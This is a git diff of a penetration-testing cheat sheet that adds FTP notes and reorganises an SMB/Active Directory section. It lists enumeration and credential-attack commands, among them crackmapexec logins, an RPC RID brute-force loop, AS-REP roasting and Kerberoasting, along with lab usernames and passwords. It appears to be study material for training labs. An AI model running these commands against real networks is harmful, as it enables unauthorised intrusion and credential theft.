@@ -69,6 +69,7 @@
   - [Local File Inclusion](#local-file-inclusion)
   - [PHP File Upload Bypass](#php-file-upload-bypass)
 - [SMB](#smb)
+- [FTP](#ftp)
 - [Active Directory](#active-directory)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -481,6 +482,12 @@ p	Paste
 
 ### NMAP
 ```bash
+# update nmap scripts (/usr/share/nmap/scripts/)
+sudo nmap --script-updatedb
+
+# grep ftp (or other) scripts
+find / -type f -name ftp* 2>/dev/null | grep scripts
+
 # locate certain scripts
 locate scripts/citrix
 
@@ -1317,17 +1324,21 @@ echo -n 'tacos123' | sha256sum
 
 # SMB
 ```bash
+==================================================================================================
+
+# samba configuration file
+cat /etc/samba/smb.conf | grep -v "#\|\;"
+
+# restart samba
+sudo systemctl restart smbd
+
+==================================================================================================
+
 # nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
+sudo nmap 10.129.14.128 -sV -sC -p139,445
 
-# bloodhound : after discovering valid user credentials and we can't winrm...! so useful
-bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
-
-#crackmapexec(smb/winrm)
-crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
-crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
-crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
-crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+==================================================================================================
 
 # smbclient
 ## Even when it says the user can only read, TRY uploading something anyway!
@@ -1336,15 +1347,60 @@ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-ban
 smbclient -L 10.10.10.175 -N
 smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
 smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"
+!ls
+!cat prep-prod.txt
 
 > recurse on
 > prompt off
 > ls
 
+==================================================================================================
 
-# dns
-dig @10.10.10.161 AXFR htb.local
-dnsenum 192.168.162.122
+# rpcclient
+rpcclient -U "" 10.129.14.128
+
+## Server information.
+srvinfo
+
+## Enumerate all domains that are deployed in the network.
+enumdomains
+
+## Provides domain, server, and user information of deployed domains.
+querydominfo
+
+## Enumerates all available shares.
+netshareenumall
+
+## Provides information about a specific share.
+netsharegetinfo <share>
+
+## Enumerates all domain users.
+enumdomusers
+
+## Enumerates all domain groups.
+enumdomgroups
+
+## Provides information about a specific user.
+queryuser <RID>
+
+## Brute Forcing User RIDs (alternative is impacket-samrdump)
+for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+
+==================================================================================================
+
+# Impacket - Samrdump.py
+samrdump.py 10.129.14.128
+
+
+==================================================================================================
+
+#crackmapexec(smb/winrm)
+crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
+crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+
+==================================================================================================
 
 # smbmap
 smbmap -H 10.10.10.161
@@ -1352,34 +1408,53 @@ smbmap -H 10.10.10.10 -u '' -p ''
 smbmap -H 10.10.10.10 -u 'guest' -p ''
 smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5
 
+==================================================================================================
+
+# Enum4Linux-ng
+
+## installation
+mightyllama@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
+mightyllama@htb[/htb]$ cd enum4linux-ng
+mightyllama@htb[/htb]$ pip3 install -r requirements.txt
+
+## Enumeration
+./enum4linux-ng.py 10.129.14.128 -A
+
+==================================================================================================
+
+# bloodhound : after discovering valid user credentials and we can't winrm...! so useful
+bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
+
+==================================================================================================
+
+# dns
+dig @10.10.10.161 AXFR htb.local
+dnsenum 192.168.162.122
+
+==================================================================================================
 
 # enum4linux
 enum4linux -a -u "" -p "" dc-ip
 enum4linux -a -u "guest" -p "" dc-ip
 
-
-# rpcclient
-## anon
-rpcclient 10.10.10.175 -N
-rpcclient -U "" -N 10.10.10.161
-> enumdomusers
-> enumdomgroups
-
+==================================================================================================
 
 # LDAP
 ## anon
 ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
 
+==================================================================================================
 
 # kerbrute
 ## anon
 ./kerbrute userenum -d heist.offsec --dc 192.168.243.165 /PATH/TO/FILE/<USERNAMES>
 
+==================================================================================================
 
 # GetADUsers
 impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
 
-
+==================================================================================================
 
 # GetNPUsers.py(18200)
 - without providing anything.
@@ -1406,6 +1481,36 @@ GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -ou
 # Kerberoast(requires valid credentials) 13100
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
+
+# FTP
+```bash
+# vsFTPd Config File
+cat /etc/vsftpd.conf
+
+# Interact with the FTP service on the target.
+ftp <FQDN/IP>
+
+# Interact with the FTP service on the target.
+nc -nv <FQDN/IP> 21
+
+# Interact with the FTP service on the target.
+telnet <FQDN/IP> 21
+
+# Interact with the FTP service on the target using encrypted connection.
+openssl s_client -connect <FQDN/IP>:21 -starttls ftp
+
+# Download all available files on the target FTP server.
+wget -m --no-passive ftp://anonymous:anonymous@<target>
+
+# debug/trace mode on
+debug
+trace
+
+# Recursive Listing
+ls -R
+
+```
+
 
 # Active Directory
 ## Important Security Groups And Exploit
